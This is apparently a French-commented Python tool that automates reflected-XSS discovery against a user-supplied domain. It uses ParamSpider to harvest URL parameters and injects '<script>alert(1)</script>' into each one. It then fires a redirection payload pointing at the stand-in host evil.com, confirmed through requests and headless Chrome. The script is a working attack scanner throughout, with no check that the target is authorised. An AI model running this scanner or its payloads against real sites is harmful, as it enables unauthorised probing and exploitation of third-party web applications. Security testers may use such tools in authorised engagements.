import requests
from itertools import product
import subprocess
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from urllib.parse import quote, urlparse
import time
import urllib.parse
import webbrowser
import os
import subprocess
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import tempfile
import re



def lancer_paramspider(url):
    try:
        print(f"[+] Lancement de : paramspider -d {url}")
        subprocess.run(["paramspider", "-d", url], check=True)
    except subprocess.CalledProcessError as e:
        print("[-] Erreur pendant l'exécution de ParamSpider.")
        print(e)
def scan_XSS(target_url):
    # Payloads XSS à tester
    xss_payloads = [
        "<script>alert(1)</script>"
    ]

    # Charger les URLs depuis un fichier
    input_file = f"results/{target_url}.txt"
    output_file = f"results/{target_url}_result.txt"

    if not os.path.exists(input_file):
        print(f"[!] Le fichier {input_file} n'existe pas.")
        return

    with open(input_file, "r") as f:
        raw_urls = [line.strip() for line in f if "FUZZ" in line]

    headers = {
        "User-Agent": "Mozilla/5.0 (XSS-Scanner)"
    }

    # Stocker les URLs déjà testées pour éviter les doublons
    tested_urls = set()

    print(f"🔍 Test de {len(raw_urls)} URLs avec permutations...\n")

    found_vulns = []

    for base_url in raw_urls:
        fuzz_count = base_url.count("FUZZ")
        if fuzz_count == 0:
            continue

        for payload in xss_payloads:
            # Générer toutes les combinaisons possibles de remplacement de FUZZ
            combos = list(product([payload, "FUZZ"], repeat=fuzz_count))

            for combo in combos:
                test_url = base_url
                for replacement in combo:
                    test_url = test_url.replace("FUZZ", replacement, 1)

                # Clé unique pour chaque URL testée
                unique_key = (test_url, payload)
                if unique_key in tested_urls:
                    continue  # Ignorer les doublons

                tested_urls.add(unique_key)

                try:
                    response = requests.get(test_url, headers=headers, timeout=5)
                    if payload in response.text:
                        print("⚠️  Vulnérabilité XSS potentielle trouvée !")
                        print(f"    ➜ Payload : {payload}")
                        print(f"    ➜ URL     : {test_url}\n")

                        found_vulns.append(f"Payload: {payload}\nURL: {test_url}\n\n")
                except requests.RequestException as e:
                    print(f"[!] Erreur de requête : {e}")

    # Écrire les résultats dans un fichier
    with open(output_file, "w") as f_out:
        if found_vulns:
            f_out.writelines(found_vulns)
            print(f"✅ Résultats enregistrés dans : {output_file}")
        else:
            f_out.write("Aucune vulnérabilité XSS trouvée.\n")
            print("✅ Aucun résultat à enregistrer (aucune vulnérabilité XSS trouvée).")
                    

def test_xss_redirection(base_url: str):
    """
    Teste la redirection XSS vers evil.com en lisant la 2ᵉ ligne du fichier
    results/<base_url_sans_schema>_result.txt (sans les 5 premiers caractères
    et sans "<script>alert(1)</script>"), puis enregistre le résultat de la
    détection directement dans ce même fichier.

    Args:
        base_url (str): URL de base (ex: "http://example.com/page" ou "https://vulnweb.com").
                        Avant de former le nom de fichier, on retire le schéma HTTP/HTTPS.

    Returns:
        tuple: (redirection_detectée: bool, url_finale: str)
    """

    # 1) On retire le schéma "http://" ou "https://" de base_url
    base_url_sans_schema = re.sub(r"^https?://", "", base_url)
    # On remplace les slashs "/" par "_" pour que le nom de fichier soit valide.
    base_url_sans_schema = base_url_sans_schema.replace("/", "_")

    # 2) Construction du chemin du fichier résultat
    fichier_result = f"results/{base_url_sans_schema}result.txt"
    if not os.path.exists(fichier_result):
        print(f"[❌] Le fichier {fichier_result} n'existe pas.")
        return False, ""

    # 3) Lecture des lignes du fichier
    try:
        with open(fichier_result, "r", encoding="utf-8") as f:
            lignes = f.readlines()
    except Exception as e:
        print(f"[⚠️] Impossible de lire {fichier_result} : {e}")
        return False, ""

    # 4) Vérification qu'il y a bien au moins 2 lignes
    if len(lignes) < 2:
        print(f"[❌] {fichier_result} ne contient pas assez de lignes (moins de 2).")
        return False, ""

    # 5) On extrait la 2ᵉ ligne (index 1), on supprime le "\n", puis on retire les 5 premiers caractères
    ligne2 = lignes[1].rstrip("\n")
    if len(ligne2) <= 5:
        print(f"[❌] La deuxième ligne de {fichier_result} est trop courte pour retirer 5 caractères : '{ligne2}'")
        return False, ""
    real_base_url = ligne2[5:].strip()

    # 6) On supprime s'il existe "<script>alert(1)</script>"
    real_base_url = real_base_url.replace("<script>alert(1)</script>", "").strip()
    print(f"[ℹ️] URL extraite (après retrait des 5 premiers caractères et suppression du script) : {real_base_url}")

    # 7) Préparation du payload XSS (qui force une redirection vers evil.com)
    payload = '<script>window.location.href="https://evil.com"</script>'
    encoded_payload = urllib.parse.quote(payload, safe="")

    # 8) Construction de l'URL de test
    #    Si real_base_url n'a pas déjà "?" ou "=" en fin, il faudra peut-être ajouter "?" avant le payload.
    #    Ici on concatène en supposant que la 2ᵉ ligne se termine correctement pour recevoir la charge.
    target_url = f"{real_base_url}{encoded_payload}"
    print(f"[ℹ️] URL de test construite avec payload : {target_url}")

    # 9) Envoi de la requête GET (suivi des redirections)
    try:
        response = requests.get(target_url, allow_redirects=True, timeout=5)
        final_url = response.url
        redirige = "evil.com" in final_url

        if redirige:
            print(f"[✅] Redirection détectée vers : {final_url}")

            # Ouverture dans le navigateur pour vérification visuelle (optionnel)
            process = subprocess.Popen(["xdg-open", target_url])
            time.sleep(5)
            process.terminate()
            time.sleep(1)
            if process.poll() is None:
                process.kill()
        else:
            print(f"[❌] Pas de redirection vers evil.com. URL finale : {final_url}")

    except requests.RequestException as e:
        print(f"[⚠️] Erreur réseau lors de la requête : {e}")
        # Même en cas d'erreur réseau, on souhaite enregistrer le fait qu'on n'a pas pu détecter de redirection
        redirige = False
        final_url = f"ErreurRequete: {e}"

    # 10) On enregistre le résultat dans le même fichier (en mode append)
    try:
        with open(fichier_result, "a", encoding="utf-8") as f:
            statut = "TRUE" if redirige else "FALSE"
            # Exemple de ligne ajoutée : "RedirectionXSS=TRUE; FinalURL=https://evil.com/…"
            f.write(f"RedirectionXSS={statut}; FinalURL={final_url}\n")
        print(f"[ℹ️] Résultat de la redirection enregistré dans {fichier_result}.")
    except Exception as e:
        print(f"[⚠️] Impossible d'écrire dans {fichier_result} : {e}")

    return redirige, final_url 

def test_XSS(target_url):


    xss_payload = '<script>window.location.href="https://evil.com"</script>'
    encoded_payload = quote(xss_payload)

    try:
        with open(f"results/{target_url}.txt", "r") as f:
            raw_urls = [line.strip() for line in f if "FUZZ" in line]
    except FileNotFoundError:
        print(f"[❌] Fichier results/{target_url}.txt introuvable.")
        return

    tested_urls = set()
    print(f"🔍 Test de {len(raw_urls)} URLs avec navigateur (Selenium)...\n")

    # Configuration compatible avec exécution root
    temp_profile = f"/tmp/chrome-profile-{os.getpid()}"
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--remote-debugging-port=9222")
    options.add_argument(f"--user-data-dir={temp_profile}")

    service = Service("/usr/bin/chromedriver")
    driver = webdriver.Chrome(service=service, options=options)

    for base_url in raw_urls:
        if "FUZZ" not in base_url:
            continue

        test_url = base_url.replace("FUZZ", encoded_payload)
        if test_url in tested_urls:
            continue
        tested_urls.add(test_url)

        print(f"🌐 Test navigateur de : {test_url}")
        try:
            driver.get(test_url)
            time.sleep(3)  # Attendre la redirection JS

            final_url = driver.current_url
            parsed_url = urlparse(final_url)
            print("🌐 Domaine détecté :", parsed_url.netloc)
            redirige = parsed_url.netloc in ["evil.com", "www.evil.com"]

            if redirige:
                print("[✅] Redirection JS détectée vers :", final_url)
                print("🛑 Scan arrêté suite à une redirection confirmée.")
                driver.quit()
                return
            else:
                print("[❌] Pas de redirection JS. URL finale :", final_url)

        except Exception as e:
            print("[⚠️] Erreur navigateur :", e)

    driver.quit()


                    
if __name__ == "__main__":
    url = input("Entrez l'URL (domaine) cible (ex: example.com) : ").strip()
    lancer_paramspider(url)
    scan_XSS(url)
    test_XSS(url) 
